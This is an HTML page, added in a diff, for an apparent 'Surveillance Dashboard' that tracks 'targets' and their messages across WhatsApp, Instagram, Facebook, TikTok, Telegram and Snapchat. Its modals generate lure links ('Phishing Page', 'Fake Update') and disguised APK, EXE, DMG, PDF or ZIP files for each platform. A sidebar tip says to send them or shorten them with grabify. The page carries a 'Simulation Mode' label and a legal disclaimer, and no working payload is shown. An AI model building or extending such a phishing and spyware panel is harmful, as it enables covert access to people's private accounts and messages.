@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveillance Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="warning-banner">
+        <i class="fas fa-exclamation-triangle"></i>
+        DISCLAIMER - HACKING IS ILLEGAL AND PURNISHABLE
+    </div>
+    
+    <div class="dashboard-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h2><i class="fas fa-user-secret"></i> Surveillance System</h2>
+                <div class="user-info">
+                    <i class="fas fa-user-circle"></i>
+                    <span>Admin</span>
+                </div>
+            </div>
+            
+            <div class="sidebar-menu">
+                <div class="menu-section">
+                    <h3><i class="fas fa-tachometer-alt"></i> Dashboard</h3>
+                    <a href="dashboard.html" class="menu-item active">
+                        <i class="fas fa-chart-bar"></i> Overview
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-mobile-alt"></i> Target Platforms</h3>
+                    <a href="whatsapp.html" class="menu-item">
+                        <i class="fab fa-whatsapp"></i> WhatsApp
+                        <span class="status-indicator active"></span>
+                    </a>
+                    <a href="instagram.html" class="menu-item">
+                        <i class="fab fa-instagram"></i> Instagram
+                        <span class="status-indicator active"></span>
+                    </a>
+                    <a href="facebook.html" class="menu-item">
+                        <i class="fab fa-facebook"></i> Facebook
+                        <span class="status-indicator active"></span>
+                    </a>
+                    <a href="tiktok.html" class="menu-item">
+                        <i class="fab fa-tiktok"></i> TikTok
+                        <span class="status-indicator active"></span>
+                    </a>
+                    <a href="telegram.html" class="menu-item">
+                        <i class="fab fa-telegram"></i> Telegram
+                        <span class="status-indicator"></span>
+                    </a>
+                    <a href="snapchat.html" class="menu-item">
+                        <i class="fab fa-snapchat"></i> Snapchat
+                        <span class="status-indicator active"></span>
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-cogs"></i> System</h3>
+                    <a href="#" class="menu-item" id="generate-link">
+                        <i class="fas fa-link"></i> Generate Link
+                    </a>
+                    <a href="#" class="menu-item" id="generate-file">
+                        <i class="fas fa-file-download"></i> Generate File
+                    </a>
+                    <a href="#" class="menu-item">
+                        <i class="fas fa-history"></i> Activity Log
+                    </a>
+                    <a href="index.html" class="menu-item logout">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </a>
+                </div>
+            </div>
+            
+            <div class="sidebar-footer">
+                <div class="system-status">
+                    <i class="fas fa-circle status-online"></i>
+                    <span>System: <strong>Online</strong></span>
+                </div>
+                <div class="simulation-mode">
+                    <i class="fas fa-virus"></i>
+                    <span>Simulation Mode</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="content-header">
+                <h1><i class="fas fa-chart-bar"></i> Surveillance Dashboard</h1>
+                <div class="header-actions">
+                    <button class="btn-refresh">
+                        <i class="fas fa-sync-alt"></i> Refresh Data
+                    </button>
+                    <div class="current-time" id="current-time"></div>
+                </div>
+            </div>
+            
+            <!-- Stats Overview -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: #25D366;">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3>WhatsApp</h3>
+                        <p class="stat-value">3 Active Targets</p>
+                        <p class="stat-detail">47 messages today</p>
+                    </div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: #E4405F;">
+                        <i class="fab fa-instagram"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3>Instagram</h3>
+                        <p class="stat-value">2 Active Targets</p>
+                        <p class="stat-detail">12 posts monitored</p>
+                    </div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: #1877F2;">
+                        <i class="fab fa-facebook"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3>Facebook</h3>
+                        <p class="stat-value">4 Active Targets</p>
+                        <p class="stat-detail">23 activities today</p>
+                    </div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: #000000;">
+                        <i class="fab fa-tiktok"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3>TikTok</h3>
+                        <p class="stat-value">Check Target</p>
+                        <p class="stat-detail"> Check videos watched</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Recent Activity -->
+            <div class="activity-section">
+                <h2><i class="fas fa-history"></i> Recent Activity</h2>
+                <div class="activity-list" id="activity-list">
+                    <!-- Activity items will be loaded here -->
+                </div>
+            </div>
+            
+            <!-- Quick Actions -->
+            <div class="quick-actions">
+                <h2><i class="fas fa-bolt"></i> Quick Actions</h2>
+                <div class="actions-grid">
+                    <button class="action-btn" onclick="window.location.href='whatsapp.html'">
+                        <i class="fab fa-whatsapp"></i>
+                        <span>WhatsApp Panel</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='instagram.html'">
+                        <i class="fab fa-instagram"></i>
+                        <span>Instagram Panel</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='facebook.html'">
+                        <i class="fab fa-facebook"></i>
+                        <span>Facebook Panel</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='tiktok.html'">
+                        <i class="fab fa-tiktok"></i>
+                        <span>TikTok Panel</span>
+                    </button>
+                    <button class="action-btn" id="gen-link-btn">
+                        <i class="fas fa-link"></i>
+                        <span>Generate Link</span>
+                    </button>
+                    <button class="action-btn" id="gen-file-btn">
+                        <i class="fas fa-file-download"></i>
+                        <span>Generate File</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Right Sidebar - Generated Items -->
+        <div class="right-sidebar">
+            <div class="right-sidebar-header">
+                <h3><i class="fas fa-code"></i> Generated Items</h3>
+                <button class="btn-clear" id="clear-all">Clear All</button>
+            </div>
+            
+            <div class="generated-items" id="generated-items">
+                <!-- Generated links/files will appear here -->
+            </div>
+            
+            <div class="simulation-info">
+                <h4><i class="fas fa-info-circle"></i> Authentication Info</h4>
+                <p>you can send this file or link or also generate short link in grabify.</p>
+                <div class="simulation-stats">
+                    <p>Links Generated: <span id="links-count">0</span></p>
+                    <p>Files Generated: <span id="files-count">0</span></p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Link Generator Modal -->
+    <div class="modal" id="link-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-link"></i> Generate Surveillance Link</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>Target Platform</label>
+                    <select id="link-platform">
+                        <option value="whatsapp">WhatsApp</option>
+                        <option value="instagram">Instagram</option>
+                        <option value="facebook">Facebook</option>
+                        <option value="tiktok">TikTok</option>
+                        <option value="telegram">Telegram</option>
+                        <option value="snapchat">Snapchat</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Link Type</label>
+                    <select id="link-type">
+                        <option value="phishing">Phishing Page</option>
+                        <option value="update">Fake Update</option>
+                        <option value="security">Security Check</option>
+                        <option value="promotion">Special Promotion</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Link Name</label>
+                    <input type="text" id="link-name" placeholder="Enter link name">
+                </div>
+                <button class="btn-generate" id="generate-link-btn">
+                    <i class="fas fa-bolt"></i> Generate Link
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- File Generator Modal -->
+    <div class="modal" id="file-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-file-download"></i> Generate Surveillance File</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>Target Platform</label>
+                    <select id="file-platform">
+                        <option value="whatsapp">WhatsApp</option>
+                        <option value="instagram">Instagram</option>
+                        <option value="facebook">Facebook</option>
+                        <option value="tiktok">TikTok</option>
+                        <option value="telegram">Telegram</option>
+                        <option value="snapchat">Snapchat</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>File Type</label>
+                    <select id="file-type">
+                        <option value="apk">Android APK</option>
+                        <option value="exe">Windows EXE</option>
+                        <option value="dmg">Mac DMG</option>
+                        <option value="pdf">PDF Document</option>
+                        <option value="zip">ZIP Archive</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>File Name</label>
+                    <input type="text" id="file-name" placeholder="Enter file name">
+                </div>
+                <button class="btn-generate" id="generate-file-btn">
+                    <i class="fas fa-bolt"></i> Generate File
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="dashboard.js"></script>
+</body>
+</html>
